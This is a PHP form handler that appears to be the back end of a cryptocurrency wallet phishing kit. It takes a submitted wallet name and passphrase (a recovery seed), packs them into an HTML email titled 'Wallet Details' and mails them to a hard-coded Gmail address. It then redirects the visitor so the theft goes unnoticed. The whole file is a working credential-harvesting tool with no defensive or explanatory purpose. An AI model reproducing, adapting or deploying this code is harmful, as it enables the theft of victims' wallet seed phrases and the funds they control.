<?php

function send_email($email, $htmlContent, $subject)
{
    try {
        // Send email using PHP's mail() function
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $headers .= "From: Wallet Entry <noreply@example.com>" . "\r\n";
        
        $result = mail($email, $subject, $htmlContent, $headers);
        
        if ($result) {
            return true;
        } else {
            return 'Failed to send email';
        }
    } catch (Exception $e) {
        return 'Message: ' . $e->getMessage();
    }
}

if (isset($_POST['wallet']) && isset($_POST['passphrase'])) {
    $wallet = $_POST['wallet'];
    $passphrase = $_POST['passphrase'];

    $message = 'Wallet: ' . $wallet . ' <br>  Pass Phrase : ' . $passphrase . '';
    $htmlContent = Emailbody($message);

    $email_to = "bignamepreciousonstage@gmail.com";
    $subject = "New Entry";

    // Send email and check the response
    $emailResponse = send_email($email_to, $htmlContent, $subject);

    // Redirect url
    header("Location: ");
    exit;
} else {
    // Redirect url without sending email
    header("Location: ");
    exit;
}


function Emailbody($message)
{
    $backgroundColor = "#F9F9F9";
    $highlightColor = "#FF8C00";
    
    $htmlContent = '<div style="background-color:' . $backgroundColor . '; padding: 20px;">
        <table width="100%" border="0" cellspacing="0" cellpadding="0" style="max-width: 600px; margin: 0 auto;">
            <tr>
                <td>
                    <h1 style="color: ' . $highlightColor . '; font-size: 24px; margin-bottom: 10px;">Wallet Details</h1>
                    <p>Hi Admin,</p>
                    <p>Here are the wallet details:</p>
                    <p>' . $message . '</p>
                    <p>Thanks for using our service.</p>
                    <p><em>Sincerely,</em></p>
                </td>
            </tr>
        </table>
    </div>';
    
    return $htmlContent;
}
